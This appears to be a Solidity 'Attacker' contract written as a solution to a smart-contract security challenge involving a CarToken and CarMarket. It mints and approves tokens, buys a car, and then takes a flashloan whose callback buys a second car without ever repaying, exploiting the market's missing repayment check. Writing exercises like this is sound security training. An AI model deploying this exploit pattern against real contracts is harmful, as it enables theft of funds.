// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./interfaces/ICarToken.sol";
import "./interfaces/ICarMarket.sol";

/**
* @title Attacker 
* @author kyrers
* @notice Execute the flashloan
*/
contract Attacker {
    /*------------------------------------------------------------
                                 VARIABLES
    --------------------------------------------------------------*/
    ICarToken private carToken;
    ICarMarket  private carMarket;

    /**
    * @notice Constructor
    */
    constructor(address _carToken, address _carMarket) {
        require(_carToken != address(0) && _carMarket != address(0), "No zero addresses");
        carToken = ICarToken(_carToken);
        carMarket = ICarMarket(_carMarket);
    }
    
    /**
    * @notice Attack
    */
    function attack() external {
        //mint & approve
        carToken.approve(address(carMarket), 100001 ether);
        carToken.mint();
        //purchase
        carMarket.purchaseCar("black", "Rolls Royce", "Phantom Drophead");
        //flashloan
        (bool success, bytes memory data) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 100000 ether));
        //console.log();
        string memory dataString = string(data);
        require(success, dataString);
    }

    function receivedCarToken(address) external {
        carMarket.purchaseCar("black", "Rolls Royce", "Wraith Black Badge");

        //No need to repay the flashloan
    }
}
